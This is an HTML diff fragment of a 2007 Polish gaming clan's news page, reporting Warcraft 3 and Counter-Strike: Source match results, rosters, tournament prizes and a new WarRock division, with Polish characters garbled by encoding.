+- <b>lnF</b>  1pkt 2Meczy<br />
+- <b>TM07</b> 0pkt 2Meczy<br />
+<br />
+<br />
+Wild vs lnF 0-2<br />
+Wild vs Cod 1-0<br />
+Wild vs TM07 2-0<br />
+lnF vs CoD 0-2<br />
+lnF vs TM07 2-0<br />
+CoD vs TM07 2-0<br />
+<br />
+<br />
+PÓFINA£Y NIEDZIELNE:<br />
+rN vs CoD 0-2<br />
+rN2 B vs Wild 0-2<br />
+<br />
+Fina³<br />
+Cod vs Wild 0-2 <br />
+<br />
+WILD MISTRZEM !
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=63">Avrl</a>, Dnia: 13.11.2007 - 10:23, <a href="index.php?site=news_comments&newsID=188">Komentarze[8]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>Puchar polski &amp; Eliminacje WCIP</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                <b>Avrl</b>: Je¶li chodzi o pierwszy mecz z poni¿ej wymienionych to przyznaje ,¿e BVG klan sk³adaj±cy siê z gwiazd polskiej sceny warcrafta by³ dla nas nie do przej¶cia. Natomiast eliminacje WCIP w jakich grali¶my wczoraj z niemieckim klanem by³y do wygrania.Moim zdaniem jak nasz czo³owy gracz <b>Almost</b> wróci do gry (w co mocno wierze ;] ) to nasz sk³ad bêdzie sta³ na najwy¿szym poziomie w historii klanu! Dziêkujemy tym którzy siê zjawili i grali na cw bo poziom gry by³ na wysokim poziomie oraz Warhiemu z którym to przewidzieli¶my calutki sk³ad JF kto na jakiej mapie bêdzie gra³ <img src="images/smileys/wink.gif" alt="zwinkern" border="0"> !Mo¿emy byc spokojnie zadowoleni pucharem polski poniewa¿ zajeli¶my miejsce 7-8 razem z Chaos-Gaming [CSG] ! Ju¿ nied³ugo rusza <b>SSL</b> w których bêdziemy brali udzia³ .<br />
+<center><table><tr><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td><td width=200><center><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>InFection</b><br>vs<br><b><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Betsson Voodoo Gaming</b><br><br><b>Data:</b> 10.11.2007<br><b>Godzina:</b> 14:00<br><b>Kana³:</b> infvsbvg<br><b>Link:</b> <a href="http://www.esl.eu/pl/wc3/clanwar/lognetmedia_final/match/7782204/?comment=0">Match</a> </td><td><img src="http://img393.imageshack.us/img393/6664/2103396smalltv3.jpg"></td></tr><br />
+<tr><td><br><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> iNF</td> <td width=200><center><font size="5">0:3</font></center></td><td align="right"><br> BVG <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td></tr><br />
+<tr><td align="right">Shimano <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Ryba <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Duriel <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td><br />
+<td><center> (1:2)<br />
+(1:2)<br />
+(0:2)<br />
+(-:-)<br />
+(-:-)</center></td><br />
+<td align="left"><br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Dragon<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Champ<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Raider<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Player<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Player<br />
+</table></center><br />
+<br><br />
+<center><table><tr><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td><td width=200><center><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>InFection</b><br>vs<br><b><img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> JuSt FrienZ.EAS.cless</b><br><br><b>Data:</b> 11.XI.2007<br><b>Godzina:</b> 20:00<br><b>Kana³:</b> <br><b>Link:</b> <a href="http://www.esl.eu/eu/wc3/wcip/season2_qual/match/8012707/?comment=0#comments">Match</a> </td><td><img src="http://img229.imageshack.us/img229/9418/justfriendzeq7.jpg"></td></tr><br />
+<tr><td><br><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> iNF</td> <td width=200><center><font size="5">2:3</font></center></td><td align="right"><br> JF <img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"></td></tr><br />
+<tr><td align="right">Duriel <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+<b>Shimano</b> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+RyBa <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+<b>Q(o.o)m</b> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Kunio<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">Souly<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td><br />
+<td><center>(0:2)<br />
+(2:0)<br />
+(0:2)<br />
+(2:0)<br />
+(1:2)</center></td><br />
+<td align="left"><br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> <b>Env0y</b><br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> XenoX<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> <b>Fyron</b><br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> Nando<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> <b>Env0y<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany">Nando</b><br />
+</table></center>
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=134">kaylanilei</a>, Dnia: 09.11.2007 - 15:50, <a href="index.php?site=news_comments&newsID=185">Komentarze[10]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>Powrót dywizji CS: Source!</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                <p align="center"><img src="http://www.infection.pl/images/squadicons/css.jpg" border="0"></p>Dnia dzisiejszego do gamingu oficjalnie powróci³a dywizja platformy CS: "¼ród³o". Ju¿ na sam pocz±tek zaInFekowani zaliczyli pierwsze zwyciêstwo w drabince ESL EU Counter-Strike: Source 5on5 Ladder z dru¿yn±, które dotychczas zajmowa³a 58 miejsce w rankingu. W sk³adzie inF.css liderem jest <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Micha³ 'core' Polak, reprezentuje go <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Adrian 'gg' Natonek, <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Jakub 'Herbi' Herbasz, <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Sebastian 'Helu' Izydorczyk oraz <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Micha³ 'night' Staszewski. GL & HF!<br />
+<br />
+ <table width="100%">
+			    <tr><td><a href="javascript:Toggle('181_1')"><img alt="read more" src="images/icons/expand.gif" border="0" id="ToggleImg_181_1"> Mecz</a></td></tr>
+				<tr>
+				  <td style="padding-left: 16px;"><span id="ToggleRow_181_1" style="display:none"><br />
+<center><table><tr><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td><td width=200><center><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>InFection</b><br>vs<br><b><img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> 	<br />
+AvatarTeam</b><br><br><b>Data:</b> 19.09.2007<br><b>Godzina:</b> 22:00<br><b>Kana³:</b> #tba<br><b>Link:</b> <a href="http://www.esl.eu/eu/css/5on5/ladder/match/8057153/">Match</a> </td><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td></tr><br />
+<tr><td><br><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> iNF</td> <td width=200><center><font size="5">22:8</font></center></td><td align="right"><br> AvatarTeam <img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"></td></tr><br />
+<tr><td align="left"><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> core<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> gg<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Herbi<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> night<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> helu </td><br />
+<td><center>(13:2/9:6)<br />
+</center></td><br />
+<td align="left"><br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> sWp<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> Ghost_Rider<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> Eisman<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> Trigga<br />
+<img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> KUROIBATTO<br />
+</table></center><br />
+<br />
+</span></td></tr></table>
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=93">core</a>, Dnia: 07.11.2007 - 23:01, <a href="index.php?site=news_comments&newsID=181">Komentarze[2]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>Avrl Przepytany !</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                Ju¿ teraz ! Gor±co zapraszam wszystkich do przeczytania wywiadu przeprowadzonego z naszym clan leaderem Avrl-em ;]<br />
+Oto link do wywiadu: <a href="http://www.infection.pl/index.php?site=articles&action=show&articlesID=12"><b>klik</b></a><br />
+Proszê o komentarze <img src="images/smileys/smile.gif" alt="lächeln" border="0">
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=134">kaylanilei</a>, Dnia: 06.11.2007 - 23:23, <a href="index.php?site=news_comments&newsID=179">Komentarze[4]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>WCIP Season II</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                <img src="http://img65.imageshack.us/img65/7749/46208no6.jpg" align="left">Z dum± InFormuje, ¿e nasz immo team <img src="http://img517.imageshack.us/img517/4048/pltx4.gif"> <b>InFection.WC3</b> zagra w II sezonie <b>Warcraft 3 International Premiership</b>. Spo¶ród 64 klanów które zapisa³y siê do ligi zagraj± miêdzy innymi (z polski):<img src="http://img517.imageshack.us/img517/4048/pltx4.gif"> Wilda D-Link,<img src="http://img517.imageshack.us/img517/4048/pltx4.gif"> Betsson Voodoo Gaming.wc3, <img src="http://img517.imageshack.us/img517/4048/pltx4.gif"> Chaos Gaming.wc3 i <img src="http://img517.imageshack.us/img517/4048/pltx4.gif"> BeYond-Duty. Spo¶ród zagranicznych klanów mo¿emy wyró¿niæ klan <img src="http://img517.imageshack.us/img517/706/deoi0.gif"> ieS-Newcomer- zwyciêzce poprzedniej edycji. <br />
+<br><br />
+A oto jakie nagrody czekaj± na zwyciêzców Season II:<br />
+<b>1 miejsce</b>:<br />
+- 6 par s³uchawek GH50 firmy Saitek.<br />
+- Konto esl premium na 6 miesiêcy dla ca³ego klanu.<br />
+- 6 graczy otrzyma konto GGC Gold na 3 miesi±ce.<br />
+- Automatyczna kwalifikacja do wc3l.<br />
+<b>2 miejsce</b>:<br />
+- Konto esl premium na 4 miesi±ce dla ca³ego klanu.<br />
+- 6 graczy otrzyma konto GGC Gold na 2 miesi±ce.<br />
+- Automatyczna kwalifikacja do wc3l.<br />
+<b>3 miejsce</b>:<br />
+- Konto esl premium na 2 miesi±ce dla ca³ego klanu.<br />
+- 6 graczy otrzyma konto GGC Gold na 1 miesi±c.<br />
+<b>4 miejsce</b>:<br />
+- Konto esl premium na 1 miesi±c dla ca³ego klanu.<br />
+<br><br />
+Nasz pierwszy mecz odbêdzie siê w Niedziele 11 Listopada o godzinie 20:00 Naszym przeciwnikiem bêdzie <img src="http://img517.imageshack.us/img517/706/deoi0.gif"> <a href="http://www.esl.eu/eu/team/2644844/">JuSt FrienZ.EAS.cless</a>   <br />
+<img src="http://img517.imageshack.us/img517/6776/ggclientlogovv0.gif" align="left"><b><br>Wszystkie gry bêd± rozgrywane na GGC. 5 graczy InF musi zarejestrowaæ swoje konto GGC w eslu.</b><br />
+<br>Mo¿emy to zrobiæ pod tym linkiem <b><a href="http://www.esl.eu/eu/wc3/wcip/season2_qual/leagueinfo/">klik</a></b><br />
+<b>Ponadto ka¿dy klan musi posiadaæ oprócz Clan Leadera 2 osoby które bêd± mia³y uprawnienia do zarz±dzania klanem, wystawiania lu itd.</b><br />
+<br>Heh no wiêc to tyle odemnie Kay-a waszego nowego redaktora <img src="images/smileys/tongue.gif" alt="zunge raus" border="0"> Gogogo InF FTW ! Musze mieæ te s³uchawki xD
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=134">kaylanilei</a>, Dnia: 05.11.2007 - 20:13, <a href="index.php?site=news_comments&newsID=177">Komentarze[11]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>WarRock w InFection !</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                Ju¿ dzisiaj dochodzi do nas dywizja <b>WarRock'a</b> sk³adaj±ca siê z 5 graczy ! Jak widzicie poni¿ej w dywizji WR jest miêdzy innymi <b>Hard90</b> - znany nam jako GTM-Shadow , Harddemon by³y <b>pro gamer</b> naszego klanu w3 ! Jakie bêd± sukcesy dru¿yny ,która zna siê z "reala" ? Tego dowiemy siê ju¿ niebawem ,a oto sk³ad :<br />
+<br />
+-  <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> <a href="index.php?site=profile&id=63">Avrl</a>&nbsp;<br />
+- <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> Dijoke<br />
+- <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> Hard<br />
+- <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> Destro<br />
+- <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> Karol<br />
+<br />
+
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=63">Avrl</a>, Dnia: 04.11.2007 - 10:34, <a href="index.php?site=news_comments&newsID=174">Komentarze[9]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>lnF vs JP</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                <center><img src="http://www.infection.pl/images/squadicons/w3.jpg"></center><br />
+<b>InF</b> wygra³o swoje kolejne spotkanie w Pucharze polski ?? Wed³ug najwiêkszych portali o tematyce w3 JP by³o faworytem. Przyznam ,¿e na jednej ze stron stawiano na nas <b>27%</b> . Jak potoczy³y siê dalsze losy ? Wzorowo <img src="images/smileys/pleased.gif" alt="erfreut" border="0"> Pokonali¶my jeden z lepszych klanów w polsce !<br />
+<center><table><tr><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td><td width=200><center><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>InFection</b><br>vs<br><b><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> JustPlay</b><br><br><b>Data:</b> 03.11.2007<br><b>Godzina:</b> 14:00<br><b>Kana³:</b> #clan lnf<br> </td><td><img src="http://img158.imageshack.us/img158/5066/beyvc6.jpg"></td></tr><br />
+<tr><td><br><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> lnF</td> <td width=200><center><font size="5">3:1</font></center></td><td align="right"><br> JustPlay <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td></tr><br />
+<tr><td align="right"><br />
+<b>InF.Shimek</b> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+<b>InF.Almost</b> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+InF.RyBa <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+<b>InF.Duriel</b> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+InF.Duriel <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">InF.Almost<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td><br />
+<td><center>(2:0)<br />
+(2:0)<br />
+(0:2)<br />
+(2:1)<br />
+(-:-)</center></td><br />
+<td align="left"><br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Snake<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Mistyk<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>Marvel</b><br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> hGm<br />
+<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Player<img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Player<br />
+</table></center>
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=63">Avrl</a>, Dnia: 03.11.2007 - 19:19, <a href="index.php?site=news_comments&newsID=171">Komentarze[9]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+
+
+</td>
+</tr>
+</table>
+
+
+
+
+
+
+		
+	</td>
+</tr>
+<tr>
+	<td valign="top"><img src="images/index_37.gif"></td>
+</tr>	
+</table>
+
+
+</td>
+</tr>
+
+</table>
+
+
+
+</td>
+
+<td valign="top">
+<table cellpadding="0" cellspacing="0" style="margin-left:7px;">
+<tr>
+	<td valign="top"><img src="images/index_31.gif"></td>
+</tr>
+<tr>
+	<td style="background-color:#151515;" align="top" a
